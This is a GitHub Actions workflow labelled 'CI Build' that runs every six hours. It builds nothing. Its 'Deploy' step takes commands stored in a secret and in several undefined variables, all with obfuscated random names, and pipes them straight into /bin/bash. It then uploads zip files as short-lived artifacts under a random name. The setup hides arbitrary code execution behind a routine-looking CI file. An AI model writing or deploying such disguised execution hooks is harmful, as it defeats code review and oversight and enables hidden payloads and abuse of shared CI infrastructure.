name: CI Build
on:
  workflow_dispatch:

  schedule:
    - cron: '50 1,7,13,19 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  dispatcher:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        env:
          xij3: ${{ secrets.xij3 }}
        run: |
          printf '%s' "$xij3" | jq -r .j7314 | /bin/bash
          echo $ow64 | jq -r .bsa26 | /bin/bash
          echo $pbab35278 | jq -r .xwiv3 | /bin/bash
          echo $ok9 | jq -r .njv2 | /bin/bash
          echo $ecwm95110 | jq -r .riz273 | /bin/bash
          printf '%s' "$tbv2727" | jq -r .vax5307 | /bin/bash
          printf '%s' "$mvrty543" | jq -r .rpk640 | /bin/bash
          printf '%s' "$dg3" | jq -r .j6055 | /bin/bash

      - name: Save results
        uses: actions/upload-artifact@v4
        with:
          name: uIoxkYpg
          path: "*.zip"
          retention-days: 1
